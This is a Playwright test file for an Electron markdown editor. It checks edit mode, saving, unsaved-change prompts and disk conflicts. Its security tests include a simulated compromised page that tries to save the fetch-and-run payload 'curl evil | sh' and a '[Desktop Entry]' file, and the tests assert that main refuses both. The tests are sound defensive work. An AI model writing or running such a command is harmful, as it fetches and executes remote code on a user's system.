import AxeBuilder from '@axe-core/playwright';
import { chmodSync, existsSync, lstatSync, mkdirSync, readdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import { expect, test, type Page } from '@playwright/test';
import { pressInMain } from '../helpers/keys';
import { saveFile } from '../helpers/save';
import { appDirs, launchApp, launchSecond, removeTempHome, tempHome } from '../helpers/launch';

const shownDocument = (window: Page) => window.locator('[data-testid="tab-panel"][data-active="true"] [data-testid="document"]');
const indicator = (window: Page, words: string) => window.locator(`.tab-indicator[data-indicator="${words}"]`);

test('Ctrl+E edits the shown file, Ctrl+S saves it with its own line endings, and Ctrl+E reads again', async () => {
  const dir = tempHome();
  const file = path.join(dir, 'notes.md');
  writeFileSync(file, '# Notes\r\n\r\nFirst line.\r\n');
  const { app, window, close } = await launchApp(['--', file]);
  try {
    await expect(shownDocument(window).locator('h1')).toHaveText('Notes');
    await pressInMain(app, window, 'E');
    await expect(window.getByTestId('status-mode')).toHaveText('Editing');
    await expect(indicator(window, 'edit mode')).toBeAttached();
    const editor = shownDocument(window).locator('.cm-content');
    await expect(editor).toBeFocused();

    await window.keyboard.press('Control+End');
    await window.keyboard.type('Second line.');
    await expect(indicator(window, 'unsaved changes')).toBeAttached();
    await window.keyboard.press('Control+s');
    await expect(window.getByTestId('status-message')).toHaveText('Saved');
    await expect(indicator(window, 'unsaved changes')).toHaveCount(0);
    expect(readFileSync(file, 'utf8')).toBe('# Notes\r\n\r\nFirst line.\r\nSecond line.');

    await pressInMain(app, window, 'E');
    await expect(window.getByTestId('status-mode')).toHaveText('Read-only');
    await expect(indicator(window, 'edit mode')).toHaveCount(0);
  } finally {
    await close();
    removeTempHome(dir);
  }
});

test('after a save, the rendered view shows the saved text', async () => {
  const dir = tempHome();
  const file = path.join(dir, 'notes.md');
  writeFileSync(file, '# Notes\n');
  const { app, window, close } = await launchApp(['--', file]);
  try {
    await expect(shownDocument(window).locator('h1')).toHaveText('Notes');
    await pressInMain(app, window, 'E');
    await expect(shownDocument(window).locator('.cm-content')).toBeFocused();
    await window.keyboard.press('Control+End');
    await window.keyboard.type('\nSaved words.');
    await window.keyboard.press('Control+s');
    await expect(window.getByTestId('status-message')).toHaveText('Saved');
    await pressInMain(app, window, 'E');
    await expect(window.getByTestId('status-mode')).toHaveText('Read-only');
    await window.keyboard.press('ControlOrMeta+U');
    await expect(shownDocument(window).locator('p')).toHaveText('Saved words.');
  } finally {
    await close();
    removeTempHome(dir);
  }
});

/** A file in edit mode with one unsaved line. Closing it would ask, so a failed test's cleanup kills it. */
async function dirtyEdit(text = '# Draft\n', { open = (file: string) => file, env }: { open?: (file: string) => string; env?: Record<string, string> } = {}) {
  const dir = tempHome();
  const file = path.join(dir, 'draft.md');
  writeFileSync(file, text);
  const launched = await launchApp(['--', open(file)], env ? { env } : {});
  const { app, window } = launched;
  await expect(shownDocument(window).locator('h1')).toHaveText('Draft');
  await pressInMain(app, window, 'E');
  await expect(shownDocument(window).locator('.cm-content')).toBeFocused();
  await window.keyboard.press('Control+End');
  await window.keyboard.type('More.');
  await expect(indicator(window, 'unsaved changes')).toBeAttached();
  return { ...launched, dir, file };
}

const unsavedDialog = (window: Page) => window.getByRole('alertdialog', { name: 'Save changes to draft.md?' });

test('closing the window with unsaved changes asks: Cancel keeps it, Save writes the file and closes it', async () => {
  const { app, window, close, dir, file } = await dirtyEdit();
  let closed = false;
  try {
    await pressInMain(app, window, 'W', true);
    await expect(unsavedDialog(window)).toBeVisible();
    await expect(unsavedDialog(window).getByRole('button', { name: 'Save', exact: true })).toBeFocused();
    await window.keyboard.press('Escape');
    await expect(unsavedDialog(window)).toHaveCount(0);
    expect(app.windows()).toHaveLength(1);

    const exited = app.waitForEvent('close');
    await pressInMain(app, window, 'W', true);
    await unsavedDialog(window).getByRole('button', { name: 'Save', exact: true }).click();
    await exited;
    closed = true;
    expect(readFileSync(file, 'utf8')).toBe('# Draft\nMore.');
  } finally {
    if (!closed) {
      app.process().kill('SIGKILL');
      await close().catch(() => {});
    }
    removeTempHome(dir);
  }
});

test("closing again while the window is still asking puts main's own question, which can close it unsaved", async () => {
  const { app, window, close, dir, file } = await dirtyEdit('# Draft\n', { env: { GALEO_TEST_CLOSE_UNSAVED_ANSWER: 'close' } });
  let closed = false;
  try {
    await pressInMain(app, window, 'W', true);
    await expect(unsavedDialog(window)).toBeVisible();
    const exited = app.waitForEvent('close');
    await pressInMain(app, window, 'W', true);
    await exited;
    closed = true;
    expect(readFileSync(file, 'utf8')).toBe('# Draft\n');
  } finally {
    if (!closed) {
      app.process().kill('SIGKILL');
      await close().catch(() => {});
    }
    removeTempHome(dir);
  }
});

test("quitting with unsaved changes asks: Cancel keeps the app, Don't save quits and leaves the file alone", async () => {
  const { app, window, close, dir, file } = await dirtyEdit();
  let quit = false;
  try {
    await pressInMain(app, window, 'Q', process.platform !== 'darwin');
    await unsavedDialog(window).getByRole('button', { name: 'Cancel', exact: true }).click();
    await expect(unsavedDialog(window)).toHaveCount(0);
    await expect(indicator(window, 'unsaved changes')).toBeAttached();

    const exited = app.waitForEvent('close');
    await pressInMain(app, window, 'Q', process.platform !== 'darwin');
    await unsavedDialog(window).getByRole('button', { name: "Don't save" }).click();
    await exited;
    quit = true;
    expect(readFileSync(file, 'utf8')).toBe('# Draft\n');
  } finally {
    if (!quit) {
      app.process().kill('SIGKILL');
      await close().catch(() => {});
    }
    removeTempHome(dir);
  }
});

test("deleting a profile with unsaved changes asks: Cancel keeps it, Don't save deletes it", async () => {
  const home = tempHome();
  const file = path.join(home, 'draft.md');
  writeFileSync(file, '# Draft\n');
  const basic = path.resolve(import.meta.dirname, '../fixtures/docs/basic.md');
  const { app, close } = await launchApp(['--', basic], { home });
  try {
    const opened = app.waitForEvent('window');
    expect(launchSecond(home, ['--profile', 'Old', '--', file]).status).toBe(0);
    const old = await opened;
    await expect(shownDocument(old).locator('h1')).toHaveText('Draft');
    await pressInMain(app, old, 'E');
    await expect(shownDocument(old).locator('.cm-content')).toBeFocused();
    await old.keyboard.type('More. ');
    await expect(indicator(old, 'unsaved changes')).toBeAttached();
    const deleteProfile = async () => {
      await old.getByTestId('profile-chip').click();
      await old.getByRole('menuitem', { name: /Delete profile/ }).click();
      await old.getByRole('alertdialog').getByRole('button', { name: 'Delete' }).click();
    };

    await deleteProfile();
    await unsavedDialog(old).getByRole('button', { name: 'Cancel', exact: true }).click();
    await expect(indicator(old, 'unsaved changes')).toBeAttached();
    expect(existsSync(path.join(appDirs(home).config, 'profiles', 'old'))).toBe(true);

    const gone = old.waitForEvent('close');
    await deleteProfile();
    await unsavedDialog(old).getByRole('button', { name: "Don't save" }).click();
    await gone;
    await expect.poll(() => existsSync(path.join(appDirs(home).config, 'profiles', 'old'))).toBe(false);
    expect(readFileSync(file, 'utf8')).toBe('# Draft\n');
  } finally {
    await close();
    removeTempHome(home);
  }
});

test('unsaved text never reaches a state file, while main holds it for a crash', async () => {
  const { app, window, home, dir } = await dirtyEdit();
  try {
    await window.keyboard.type(' Words not saved yet.');
    // The page hands its unsaved text to main once typing pauses for a second.
    await window.waitForTimeout(1500);
    // A new window makes the profile save its session now, with the edited tab in it.
    await pressInMain(app, window, 'N');
    await expect.poll(() => app.windows().length).toBe(2);
    const session = path.join(appDirs(home).state, 'profiles', 'default', 'session.json');
    // Saved 2 s after the last change.
    const windowsSaved = () => (existsSync(session) ? (JSON.parse(readFileSync(session, 'utf8')) as { windows: unknown[] }).windows.length : 0);
    await expect.poll(windowsSaved, { timeout: 15_000 }).toBe(2);
    const state = path.join(appDirs(home).state, 'profiles', 'default');
    for (const name of readdirSync(state)) expect(readFileSync(path.join(state, name), 'utf8')).not.toContain('not saved yet');
  } finally {
    app.process().kill('SIGKILL');
    removeTempHome(home);
    removeTempHome(dir);
  }
});

const message = (window: Page) => window.getByTestId('status-message');

const diskBar = (window: Page, kind: 'changed' | 'deleted') =>
  window.locator(`[data-testid="tab-panel"][data-active="true"] [data-testid="document-banner"][data-banner="disk-${kind}"]`);

test('a change on disk while edits are unsaved is never overwritten: the bar asks, and Keep mine saves over it', async () => {
  const { app, window, home, dir, file } = await dirtyEdit();
  try {
    saveFile(file, '# Theirs\n');
    await expect(diskBar(window, 'changed')).toContainText('File changed on disk');
    await expect(shownDocument(window).locator('.cm-content')).toContainText('More.');

    await window.keyboard.press('Control+s');
    await expect(message(window)).toHaveText('Not saved: the file changed on disk. Keep mine or load theirs first');
    expect(readFileSync(file, 'utf8')).toBe('# Theirs\n');
    await expect(indicator(window, 'unsaved changes')).toBeAttached();

    await diskBar(window, 'changed').getByRole('button', { name: 'Keep mine' }).click();
    await expect(diskBar(window, 'changed')).toHaveCount(0);
    await window.keyboard.press('Control+s');
    await expect(message(window)).toHaveText('Saved');
    expect(readFileSync(file, 'utf8')).toBe('# Draft\nMore.');
    await expect(indicator(window, 'unsaved changes')).toHaveCount(0);
  } finally {
    app.process().kill('SIGKILL');
    removeTempHome(home);
    removeTempHome(dir);
  }
});

test('the unsaved question and the disk bar give focus back to the editor when they close', async () => {
  const { app, window, home, dir, file } = await dirtyEdit();
  const editor = shownDocument(window).locator('.cm-content');
  try {
    await pressInMain(app, window, 'W');
    await expect(unsavedDialog(window).getByRole('button', { name: 'Save', exact: true })).toBeFocused();
    await window.keyboard.press('Escape');
    await expect(unsavedDialog(window)).toHaveCount(0);
    await expect(editor).toBeFocused();

    for (const choice of ['Keep mine', 'Load theirs'] as const) {
      saveFile(file, `# ${choice}\n`);
      await diskBar(window, 'changed').getByRole('button', { name: choice }).press('Enter');
      await expect(diskBar(window, 'changed')).toHaveCount(0);
      await expect(editor, choice).toBeFocused();
    }

    await window.keyboard.type('Again.');
    rmSync(file);
    await diskBar(window, 'deleted').getByRole('button', { name: 'Save again' }).press('Enter');
    await expect(message(window)).toHaveText('Saved');
    await expect(editor).toBeFocused();
  } finally {
    app.process().kill('SIGKILL');
    removeTempHome(home);
    removeTempHome(dir);
  }
});

test('Show diff puts mine beside theirs, read-only and accessible; Esc goes back to the bar, Keep mine from it saves over', async () => {
  const { app, window, home, dir, file } = await dirtyEdit();
  try {
    saveFile(file, '# Theirs\n');
    const showDiff = diskBar(window, 'changed').getByRole('button', { name: 'Show diff' });
    await showDiff.click();
    const diff = window.getByRole('dialog', { name: 'Changes: mine | theirs' });
    await expect(diff.getByRole('textbox', { name: 'Mine (unsaved)' })).toContainText('More.');
    await expect(diff.getByRole('textbox', { name: 'Theirs (on disk)' })).toContainText('# Theirs');
    await expect(diff.getByRole('textbox', { name: 'Mine (unsaved)' })).toHaveAttribute('aria-readonly', 'true');
    for (const scheme of ['light', 'dark'] as const) {
      await app.evaluate(({ nativeTheme }, value) => (nativeTheme.themeSource = value), scheme);
      const results = await new AxeBuilder({ page: window }).setLegacyMode(true).include('[role="dialog"]').analyze();
      expect(results.violations, scheme).toEqual([]);
    }
    await window.keyboard.press('Escape');
    await expect(diff).toHaveCount(0);
    await expect(showDiff).toBeFocused();

    await showDiff.click();
    await diff.getByRole('button', { name: 'Keep mine' }).click();
    await expect(diff).toHaveCount(0);
    await expect(diskBar(window, 'changed')).toHaveCount(0);
    await expect(shownDocument(window).locator('.cm-content')).toBeFocused();
    await window.keyboard.press('Control+s');
    await expect(message(window)).toHaveText('Saved');
    expect(readFileSync(file, 'utf8')).toBe('# Draft\nMore.');
  } finally {
    app.process().kill('SIGKILL');
    removeTempHome(home);
    removeTempHome(dir);
  }
});

test('Load theirs replaces the unsaved text with the file on disk and writes nothing', async () => {
  const { app, window, home, dir, file } = await dirtyEdit();
  try {
    saveFile(file, '# Theirs\n');
    await diskBar(window, 'changed').getByRole('button', { name: 'Load theirs' }).click();
    await expect(shownDocument(window).locator('.cm-content')).toHaveText('# Theirs');
    await expect(indicator(window, 'unsaved changes')).toHaveCount(0);
    await expect(window.getByTestId('status-mode')).toHaveText('Editing');
    expect(readFileSync(file, 'utf8')).toBe('# Theirs\n');
  } finally {
    app.process().kill('SIGKILL');
    removeTempHome(home);
    removeTempHome(dir);
  }
});

test('a file deleted under unsaved edits keeps them, and Save again writes it back with its line endings', async () => {
  const { app, window, home, dir, file } = await dirtyEdit('# Draft\r\n');
  try {
    rmSync(file);
    await expect(diskBar(window, 'deleted')).toContainText('File deleted on disk');
    await expect(window.getByTestId('document-state')).toHaveCount(0);
    await expect(shownDocument(window).locator('.cm-content')).toContainText('More.');

    await diskBar(window, 'deleted').getByRole('button', { name: 'Save again' }).click();
    await expect(message(window)).toHaveText('Saved');
    expect(readFileSync(file, 'utf8')).toBe('# Draft\r\nMore.');
    await expect(indicator(window, 'unsaved changes')).toHaveCount(0);
    // Read again as it is now: the editor shows the file, and nothing asks.
    await expect(shownDocument(window).locator('.cm-content')).toContainText('More.');
    await expect(diskBar(window, 'deleted')).toHaveCount(0);
    await expect(diskBar(window, 'changed')).toHaveCount(0);
  } finally {
    app.process().kill('SIGKILL');
    removeTempHome(home);
    removeTempHome(dir);
  }
});

/** `notes.md` handed over on the command line, linking to `target.md` and to a file that isn't there. */
async function linked(answer: 'edit' | 'cancel') {
  const dir = tempHome();
  const file = path.join(dir, 'notes.md');
  const target = path.join(dir, 'target.md');
  writeFileSync(file, '# Notes\n\n[Target](target.md) and [nothing](missing.md)\n');
  writeFileSync(target, '# Target\n');
  const launched = await launchApp(['--', file], { env: { GALEO_TEST_EDIT_ANSWER: answer } });
  await expect(shownDocument(launched.window).locator('h1')).toHaveText('Notes');
  const asked = () => launched.app.evaluate(() => (globalThis as { __galeoEditAsked?: string[] }).__galeoEditAsked ?? []);
  const activeTab = () => launched.window.evaluate(async () => (await window.galeo.tabs.snapshot()).active!);
  return { ...launched, dir, file, target, asked, activeTab };
}

test("a file reached through a link asks once in main's own dialog before edit mode; a file handed over doesn't", async () => {
  const { app, window, close, dir, target, asked } = await linked('edit');
  try {
    await pressInMain(app, window, 'E');
    await expect(window.getByTestId('status-mode')).toHaveText('Editing');
    expect(await asked()).toEqual([]);
    await pressInMain(app, window, 'E');
    await expect(window.getByTestId('status-mode')).toHaveText('Read-only');
    // Edit mode left the source showing.
    await window.keyboard.press('ControlOrMeta+U');

    await shownDocument(window).getByRole('link', { name: 'Target' }).click();
    await expect(shownDocument(window).locator('h1')).toHaveText('Target');
    await pressInMain(app, window, 'E');
    await expect(window.getByTestId('status-mode')).toHaveText('Editing');
    expect(await asked()).toEqual([target]);
    await pressInMain(app, window, 'E');
    await expect(window.getByTestId('status-mode')).toHaveText('Read-only');
    await pressInMain(app, window, 'E');
    await expect(window.getByTestId('status-mode')).toHaveText('Editing');
    expect(await asked()).toEqual([target]);
  } finally {
    await close();
    removeTempHome(dir);
  }
});

test('a page that switches to a linked tab just before Ctrl+E gets no edit mode unless the reader confirms, and its saves are refused', async () => {
  const { app, window, close, dir, file, target, asked, activeTab } = await linked('cancel');
  try {
    const notes = await activeTab();
    await shownDocument(window).click();
    const opened = await window.evaluate((id) => globalThis.window.galeo.documents.followLink(id, 'target.md', 'background'), notes);
    expect(opened).toMatchObject({ kind: 'opened' });
    const other = (await window.evaluate(async () => (await globalThis.window.galeo.tabs.snapshot()).tabs.map((tab) => tab.id))).find((id) => id !== notes)!;
    await window.evaluate((id) => globalThis.window.galeo.tabs.activated(id), other);
    await pressInMain(app, window, 'E');
    await expect.poll(asked).toEqual([target]);
    await shownDocument(window).click();
    const save = await window.evaluate((id) => globalThis.window.galeo.documents.save(id, 'curl evil | sh\n', null), other);
    expect(save).toEqual({ kind: 'refused', reason: 'not-editable' });
    expect(readFileSync(target, 'utf8')).toBe('# Target\n');
    expect(readFileSync(file, 'utf8')).toContain('# Notes');
  } finally {
    await close();
    removeTempHome(dir);
  }
});

test("Ctrl+E on a file that isn't there is refused by main, and a save can't create it", async () => {
  const { app, window, close, dir, asked, activeTab } = await linked('edit');
  try {
    await shownDocument(window).getByRole('link', { name: 'nothing' }).click();
    await expect(window.getByTestId('document-state')).toBeVisible();
    // Main's own answer, not the page's: a compromised page wouldn't give a grant back.
    const browserWindow = await app.browserWindow(window);
    await browserWindow.evaluate((each) => {
      const sent: unknown[] = ((globalThis as { __galeoEditModeSent?: unknown[] }).__galeoEditModeSent = []);
      const send = each.webContents.send.bind(each.webContents);
      each.webContents.send = (channel: string, ...args: unknown[]) => {
        if (channel === 'documents.editMode') sent.push(args[0]);
        send(channel, ...args);
      };
    });
    await pressInMain(app, window, 'E');
    await expect(window.getByTestId('status-message')).toHaveText("This file can't be edited");
    expect(await app.evaluate(() => (globalThis as { __galeoEditModeSent?: { edit: string }[] }).__galeoEditModeSent?.map((event) => event.edit))).toEqual(['refused']);
    expect(await asked()).toEqual([]);
    const missing = await activeTab();
    await window.getByTestId('document-state').click();
    const save = await window.evaluate((id) => globalThis.window.galeo.documents.save(id, '[Desktop Entry]\n', null), missing);
    expect(save).toEqual({ kind: 'refused', reason: 'not-editable' });
    expect(existsSync(path.join(dir, 'missing.md'))).toBe(false);
  } finally {
    await close();
    removeTempHome(dir);
  }
});

test('saving a symlinked file writes its target and keeps the link', async () => {
  let link = '';
  const { app, window, home, dir, file } = await dirtyEdit('# Draft\n', {
    open: (target) => {
      const links = path.join(path.dirname(target), 'links');
      mkdirSync(links);
      link = path.join(links, 'draft.md');
      symlinkSync(target, link);
      return link;
    },
  });
  try {
    await window.keyboard.press('Control+s');
    await expect(message(window)).toHaveText('Saved');
    expect(lstatSync(link).isSymbolicLink()).toBe(true);
    expect(readFileSync(file, 'utf8')).toBe('# Draft\nMore.');
  } finally {
    app.process().kill('SIGKILL');
    removeTempHome(home);
    removeTempHome(dir);
  }
});

test.describe(() => {
  test.skip(process.platform === 'win32' || process.getuid?.() === 0, 'POSIX permissions, as a user other than root');
  test("a read-only file isn't replaced: the save says so and the edits stay", async () => {
    const { app, window, home, dir, file } = await dirtyEdit();
    try {
      chmodSync(file, 0o444);
      await window.keyboard.press('Control+s');
      await expect(message(window)).toHaveText('Not saved: no permission to write this file');
      expect(readFileSync(file, 'utf8')).toBe('# Draft\n');
      await expect(indicator(window, 'unsaved changes')).toBeAttached();
    } finally {
      app.process().kill('SIGKILL');
      chmodSync(file, 0o644);
      removeTempHome(home);
      removeTempHome(dir);
    }
  });
});
